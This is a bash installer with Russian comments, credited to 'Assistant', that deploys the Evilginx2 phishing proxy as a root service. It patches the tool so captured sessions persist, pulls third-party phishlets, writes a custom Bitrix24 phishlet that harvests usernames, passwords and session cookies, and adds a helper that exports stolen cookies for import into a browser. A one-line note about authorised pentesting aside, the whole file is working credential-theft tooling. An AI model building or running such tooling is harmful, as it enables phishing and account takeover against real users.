#!/bin/bash

# Evilginx2 Автоматическая установка
# Автор: Assistant
# Дата: $(date +%Y-%m-%d)

set -e  # Выходим при любой ошибке

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Функция для логирования
log() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
    exit 1
}

success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

# Проверка прав root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "Этот скрипт должен быть запущен с правами root (sudo)"
    fi
}

# Проверка операционной системы
check_os() {
    if [[ ! -f /etc/os-release ]]; then
        error "Не удается определить операционную систему"
    fi
    
    . /etc/os-release
    OS=$NAME
    VER=$VERSION_ID
    
    log "Обнаружена ОС: $OS $VER"
    
    # Поддерживаемые системы
    case $ID in
        ubuntu|debian)
            PACKAGE_MANAGER="apt-get"
            ;;
        centos|rhel|fedora)
            PACKAGE_MANAGER="yum"
            ;;
        *)
            warning "ОС $OS может не поддерживаться полностью"
            PACKAGE_MANAGER="apt-get"  # По умолчанию
            ;;
    esac
}

# Установка зависимостей
install_dependencies() {
    log "Обновление пакетов..."
    case $PACKAGE_MANAGER in
        "apt-get")
            apt-get update -qq
            log "Установка зависимостей (Git, Go)..."
            apt-get install -y git golang-go build-essential
            ;;
        "yum")
            yum update -y -q
            log "Установка зависимостей (Git, Go)..."
            yum install -y git golang make
            ;;
    esac
}

# Проверка версии Go
check_go_version() {
    if ! command -v go &> /dev/null; then
        error "Go не установлен"
    fi
    
    GO_VERSION=$(go version | grep -oP 'go\K[0-9]+\.[0-9]+')
    REQUIRED_VERSION="1.19"
    
    if [[ $(echo -e "$GO_VERSION\n$REQUIRED_VERSION" | sort -V | head -n1) != "$REQUIRED_VERSION" ]]; then
        error "Требуется Go версии $REQUIRED_VERSION или выше. Установлена версия: $GO_VERSION"
    fi
    
    success "Go версии $GO_VERSION установлен корректно"
}

# Удаление существующей установки
remove_existing() {
    if [[ -d "/root/evilginx2" ]]; then
        warning "Обнаружена существующая установка. Удаляем..."
        rm -rf /root/evilginx2
    fi
    
    if [[ -f "/usr/local/bin/evilginx" ]]; then
        warning "Удаляем существующий бинарник..."
        rm -f /usr/local/bin/evilginx
    fi
}

# Клонирование репозитория
clone_repository() {
    log "Клонирование Evilginx2 в /root/evilginx2..."
    git clone https://github.com/kgretzky/evilginx2.git /root/evilginx2
    
    if [[ ! -d "/root/evilginx2" ]]; then
        error "Не удалось склонировать репозиторий"
    fi
    
    success "Репозиторий успешно склонирован"
}

# Применение патча для сохранения сессий в базу данных
apply_database_patch() {
    log "Применение патча для исправления сохранения сессий в базе данных..."
    
    cd /root/evilginx2
    
    # Определить директорию скрипта
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    
    # Проверить наличие патча
    if [[ -f "$SCRIPT_DIR/evilginx2_database_fix.patch" ]]; then
        log "Найден патч базы данных, применяем..."
        
        # Создать резервную копию
        cp core/http_proxy.go core/http_proxy.go.orig
        
        # Применить патч
        if patch -p1 < "$SCRIPT_DIR/evilginx2_database_fix.patch"; then
            success "Патч базы данных применен успешно"
        else
            warning "Патч применился частично, добавляем недостающие исправления вручную..."
            # Добавить db.Flush() вручную в ключевых местах
            sed -i "/CreateSession.*err.*log.Error/a\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
            sed -i "/SetSessionUsername.*err.*log.Error/a\\t\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
            sed -i "/SetSessionPassword.*err.*log.Error/a\\t\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
            sed -i "/SetSessionCookieTokens.*err.*log.Error/a\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
            sed -i "/SetSessionHttpTokens.*err.*log.Error/a\\t\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
        fi
    else
        warning "Файл патча не найден, применяем базовые исправления..."
        # Создать резервную копию
        cp core/http_proxy.go core/http_proxy.go.orig
        # Добавить db.Flush() в ключевых местах для сохранения сессий
        sed -i "/CreateSession.*err.*log.Error/a\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
        sed -i "/SetSessionUsername.*err.*log.Error/a\\t\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
        sed -i "/SetSessionPassword.*err.*log.Error/a\\t\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
        sed -i "/SetSessionCookieTokens.*err.*log.Error/a\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
        sed -i "/SetSessionHttpTokens.*err.*log.Error/a\\t\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
    fi
    
    # Проверить что исправления применились
    flush_count=$(grep -c "db\.Flush()" core/http_proxy.go || echo "0")
    if [[ "$flush_count" -gt 0 ]]; then
        success "Добавлено $flush_count вызовов db.Flush() для надежного сохранения сессий"
    else
        warning "Не удалось автоматически применить исправления. Используется оригинальная версия."
        cp core/http_proxy.go.orig core/http_proxy.go
    fi
}
# Компиляция Evilginx2
compile_evilginx() {
    log "Компиляция Evilginx2..."
    cd /root/evilginx2
    
    # Установка Go зависимостей
    go mod download
    go mod verify
    
    # Компиляция
    make build
    
    if [[ ! -f "/root/evilginx2/build/evilginx" ]]; then
        error "Не удалось скомпилировать Evilginx2"
    fi
    
    success "Evilginx2 успешно скомпилирован"
}

# Установка бинарника
install_binary() {
    log "Установка бинарника в /usr/local/bin/..."
    
    cp /root/evilginx2/build/evilginx /usr/local/bin/
    chmod +x /usr/local/bin/evilginx
    
    # Проверка установки
    if ! command -v evilginx &> /dev/null; then
        error "Не удалось установить evilginx в PATH"
    fi
    
    success "Evilginx2 установлен в /usr/local/bin/evilginx"
}

# Создание рабочих директорий
create_directories() {
    log "Создание рабочих директорий..."
    
    mkdir -p /root/evilginx2-data/{phishlets,redirectors,database}
    
    # Копирование phishlets из исходников
    if [[ -d "/root/evilginx2/phishlets" ]]; then
        cp -r /root/evilginx2/phishlets/* /root/evilginx2-data/phishlets/ 2>/dev/null || true
    fi
    
    # Копирование redirectors из исходников  
    if [[ -d "/root/evilginx2/redirectors" ]]; then
        cp -r /root/evilginx2/redirectors/* /root/evilginx2-data/redirectors/ 2>/dev/null || true
    fi
    
    success "Рабочие директории созданы в /root/evilginx2-data/"
}

# Установка phishlets из репозитория
install_phishlets() {
    install_session_tools
    log "Установка phishlets из репозитория..."
    
    # Определить директорию скрипта
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    
    # Проверить наличие директории phishlets в репозитории
    if [[ -d "$SCRIPT_DIR/phishlets" ]]; then
        # Копировать все phishlets из репозитория (включая скрытые файлы)
        log "Копирование $(ls -1 "$SCRIPT_DIR/phishlets/"*.yaml 2>/dev/null | wc -l) phishlets из репозитория..."
        
        # Убедиться, что целевая директория существует
        mkdir -p /root/evilginx2-data/phishlets/
        
        # Копировать все .yaml файлы
        if cp "$SCRIPT_DIR/phishlets/"*.yaml /root/evilginx2-data/phishlets/ 2>/dev/null; then
            success "Phishlets из репозитория установлены"
        else
            # Если не получилось с wildcard, копируем по одному
            log "Копирование phishlets по одному файлу..."
            for file in "$SCRIPT_DIR/phishlets/"*.yaml; do
                if [[ -f "$file" ]]; then
                    cp "$file" /root/evilginx2-data/phishlets/
                fi
            done
            success "Phishlets скопированы индивидуально"
        fi
        
        # Проверить результат
        copied_count=$(ls -1 /root/evilginx2-data/phishlets/*.yaml 2>/dev/null | wc -l)
        log "Скопировано $copied_count phishlet файлов"
        
        # Установить правильные права доступа
        chown root:root /root/evilginx2-data/phishlets/*.yaml 2>/dev/null || true
        chmod 644 /root/evilginx2-data/phishlets/*.yaml 2>/dev/null || true
        
    else
        warning "Директория phishlets не найдена в репозитории"
        
        # Fallback: попытаться скачать из интернета
        log "Попытка загрузки phishlets из интернета..."
        cd /tmp
        if git clone https://github.com/An0nUD4Y/Evilginx2-Phishlets.git 2>/dev/null; then
            cp /tmp/Evilginx2-Phishlets/*.yaml /root/evilginx2-data/phishlets/ 2>/dev/null || true
            rm -rf /tmp/Evilginx2-Phishlets
            success "Phishlets загружены из интернета"
        else
            warning "Не удалось загрузить phishlets. Создаем только базовые."
        fi
    fi
    
    # Проверить, есть ли уже Bitrix24 phishlets в репозитории
    if [[ ! -f "/root/evilginx2-data/phishlets/bitrix24-universal.yaml" ]]; then
        log "Создание дополнительных кастомных phishlets..."
        
        # Bitrix24 Universal phishlet (только если его еще нет)
        cat > /root/evilginx2-data/phishlets/bitrix24-universal.yaml << 'EOF'
author: 'AKUMA-EvilGinx2-AutoInstaller'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: '{target_domain}', session: true, is_landing: true}
sub_filters:
  - {triggers_on: '{target_domain}', orig_sub: '', domain: '{target_domain}', search: '{target_domain}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
auth_tokens:
  - domain: '.{target_domain}'
    keys: ['BITRIX_SM_LOGIN', 'BITRIX_SM_UIDH', 'BITRIX_SM_CC']
auth_urls:
  - '/index.php?login=yes'
  - '/auth/'
credentials:
  username:
    key: 'USER_LOGIN'
    search: 'USER_LOGIN=([^&]*)'
    type: 'post'
  password:
    key: 'USER_PASSWORD'
    search: 'USER_PASSWORD=([^&]*)'
    type: 'post'
login:
  domain: '{target_domain}'
  path: '/index.php?login=yes'
EOF
        success "Дополнительные phishlets созданы"
    fi
    
    # Подсчитать количество
    phishlets_count=$(ls -1 /root/evilginx2-data/phishlets/*.yaml 2>/dev/null | wc -l)
    success "Всего установлено $phishlets_count phishlets"
}

# Создание systemd сервиса
# Установка дополнительных инструментов для работы с сессиями
install_session_tools() {
    log "Установка инструментов для работы с сессиями..."
    
    # Определить директорию скрипта
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    
    # Скопировать скрипт экспорта сессий если он есть
    if [[ -f "$SCRIPT_DIR/export_sessions.sh" ]]; then
        cp "$SCRIPT_DIR/export_sessions.sh" /root/evilginx2-data/
        chmod +x /root/evilginx2-data/export_sessions.sh
        success "Скрипт экспорта сессий установлен"
    else
        warning "Скрипт экспорта сессий не найден в репозитории"
    fi
    
    # Создать символьные ссылки для удобства
    if [[ -f "/root/evilginx2-data/export_sessions.sh" ]]; then
        ln -sf /root/evilginx2-data/export_sessions.sh /usr/local/bin/evilginx-sessions 2>/dev/null || true
        ln -sf /root/evilginx2-data/export_sessions.sh /usr/local/bin/evilginx-export 2>/dev/null || true
        log "Созданы команды: evilginx-sessions, evilginx-export"
    fi
    
    # Установить evilginx2_manager.sh если он есть
    if [[ -f "$SCRIPT_DIR/evilginx2_manager.sh" ]]; then
        cp "$SCRIPT_DIR/evilginx2_manager.sh" /usr/local/bin/evilginx-manager
        chmod +x /usr/local/bin/evilginx-manager
        success "Менеджер Evilginx2 установлен как команда: evilginx-manager"
    fi
    
    # Создать команду для быстрого копирования cookies
    cat > /usr/local/bin/evilginx-copy-cookies << "COOKIESCRIPT"
#!/bin/bash
SESSION_ID="$1"
if [[ -z "$SESSION_ID" ]]; then
    echo "Usage: evilginx-copy-cookies <session_id>"
    echo "Example: evilginx-copy-cookies 1"
    exit 1
fi
COOKIES=$(/root/evilginx2-data/export_sessions.sh "$SESSION_ID" cookies | grep -v "=== Session" | grep -v "^$")
if [[ -n "$COOKIES" ]]; then
    echo "$COOKIES"
    echo ""
    echo "Cookies copied to output. Use StorageAce extension to import:"
    echo "https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo"
    if command -v xclip >/dev/null 2>&1; then
        echo "$COOKIES" | xclip -selection clipboard
        echo "Cookies also copied to clipboard!"
    fi
else
    echo "No cookies found for session $SESSION_ID"
fi
COOKIESCRIPT
    chmod +x /usr/local/bin/evilginx-copy-cookies
    success "Команда evilginx-copy-cookies создана"
}
create_service() {
    log "Создание systemd сервиса..."
    
    cat > /etc/systemd/system/evilginx2.service << EOF
[Unit]
Description=Evilginx2 Phishing Framework
After=network.target
Wants=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/evilginx2-data
ExecStart=/usr/local/bin/evilginx -p /root/evilginx2-data/phishlets -t /root/evilginx2-data/redirectors -c /root/evilginx2-data
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    success "Systemd сервис создан"
}

# Финальная проверка
final_check() {
    log "Проверка установки..."
    
    VERSION_OUTPUT=$(evilginx -v 2>&1 || true)
    if [[ $? -eq 0 ]]; then
        success "Evilginx2 успешно установлен!"
        
        # Проверить, что исправления для базы данных применены
        if grep -q "db\.Flush()" /root/evilginx2/core/http_proxy.go; then
            flush_count=$(grep -c "db\.Flush()" /root/evilginx2/core/http_proxy.go)
            success "Исправления для сохранения сессий применены ($flush_count вызовов db.Flush())"
        else
            warning "Исправления для базы данных не обнаружены - сессии могут не сохраняться"
        fi
        echo -e "${GREEN}Версия:${NC} $VERSION_OUTPUT"
    else
        error "Установка завершена, но есть проблемы с запуском"
    fi
}

# Вывод справочной информации
show_usage_info() {
    echo -e "\n${GREEN}=== Evilginx2 успешно установлен! ===${NC}"
        
        # Проверить, что исправления для базы данных применены
        if grep -q "db\.Flush()" /root/evilginx2/core/http_proxy.go; then
            flush_count=$(grep -c "db\.Flush()" /root/evilginx2/core/http_proxy.go)
            success "Исправления для сохранения сессий применены ($flush_count вызовов db.Flush())"
        else
            warning "Исправления для базы данных не обнаружены - сессии могут не сохраняться"
        fi
    echo -e "\n${BLUE}Основные команды:${NC}"
    echo -e "  ${YELLOW}evilginx${NC}                    - Запуск в интерактивном режиме"
    echo -e "  ${YELLOW}systemctl start evilginx2${NC}   - Запуск как сервис"
    echo -e "  ${YELLOW}systemctl stop evilginx2${NC}    - Остановка сервиса"
    echo -e "  ${YELLOW}systemctl enable evilginx2${NC}  - Автозапуск при старте системы"
    echo -e "  ${YELLOW}evilginx-manager${NC}            - Менеджер для управления Evilginx2"
    echo -e "  ${YELLOW}evilginx-sessions${NC}           - Просмотр сохраненных сессий"
    echo -e "  ${YELLOW}evilginx-copy-cookies 1${NC}     - Быстрое копирование cookies для импорта"
    
    echo -e "\n${BLUE}Директории:${NC}"
    echo -e "  ${YELLOW}Исходный код:${NC}      /root/evilginx2/"
    echo -e "  ${YELLOW}Рабочие файлы:${NC}     /root/evilginx2-data/"
    echo -e "  ${YELLOW}Phishlets:${NC}         /root/evilginx2-data/phishlets/"
    echo -e "  ${YELLOW}Redirectors:${NC}       /root/evilginx2-data/redirectors/"
    
    echo -e "\n${BLUE}Документация:${NC}"
    echo -e "  ${YELLOW}Официальная помощь:${NC} https://help.evilginx.com"
    echo -e "  ${YELLOW}GitHub репозиторий:${NC} https://github.com/kgretzky/evilginx2"
    
    echo -e "\n${RED}ВНИМАНИЕ:${NC} Используйте только для авторизованного тестирования на проникновение!"
}

# Основная функция
main() {
    echo -e "${GREEN}"
    echo "=================================================="
    echo "         Evilginx2 Автоматический установщик"
    echo "=================================================="
    echo -e "${NC}\n"
    
    check_root
    check_os
    install_dependencies
    check_go_version
    remove_existing
    clone_repository
    apply_database_patch
    compile_evilginx
    install_binary
    create_directories
    install_phishlets
    install_session_tools
    create_service
    final_check
    show_usage_info
    
    echo -e "\n${GREEN}Установка завершена успешно!${NC}"
}

# Запуск основной функции
main "$@"
